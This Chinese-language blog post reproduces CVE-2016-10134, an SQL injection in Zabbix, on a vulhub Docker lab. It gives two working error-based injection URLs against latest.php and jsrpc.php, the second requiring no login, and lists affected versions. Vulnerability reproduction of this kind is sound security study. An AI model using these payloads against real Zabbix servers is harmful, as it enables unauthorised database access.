---
layout: post
title: Zabbix SQL注入漏洞
tags: Zabbix
categories: CVE-2016-10134
---

# Zabbix SQL注入漏洞（CVE-2016-10134）

Zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的服务器监控软件，WEB界面用PHP编写。
Zabbix能监视各种网络参数，保证服务器系统的安全运营；Zabbix由2部分构成，Zabbix server与可选组件Zabbix agent。

## 漏洞描述

Zabbix软件的jsrpc.php文件在处理profileIdx2参数时以及latest.php文件在处理toggle_ids参数时都存在insert方式的SQL注入漏洞。

## 漏洞复现

首先使用GitHub中的[vulhub](!https://github.com/vulhub/vulhub.git)项目docker一键部署。
环境启动后，访问`http://your-ip:8080`，用账号guest（密码为空）登录游客账户。

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Zabbix/CVE-2016-10134/15931650900796.jpg)

登录后，查看Cookie中的zbx_sessionid，复制后16位字符：

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Zabbix/CVE-2016-10134/15931654745731.jpg)

1.latest.php

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Zabbix/CVE-2016-10134/15931659304400.jpg)

将Cookie中的zbx_sessionid的后16个字符作为sid的值，访问http://your-ip:8080/latest.php?output=ajax&sid=4aed96edbd5b9d3c&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0x23,database()),0)，可见成功注入：

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Zabbix/CVE-2016-10134/15931666716799.jpg)

2.jsrpc.php

此处不需要登录，直接访问http://your-ip:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0x23,database()),0)

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Zabbix/CVE-2016-10134/15931669293745.jpg)

## 受影响的版本

ZABBIX 2.0.5、2.0.13、2.2.x、2.4.2、2.4.5、2.4.7、2.4.8、2.5.0、3.0.0-3.0.3

## 参考链接

https://darkless.cn/2019/08/03/zabbix-sql-injection/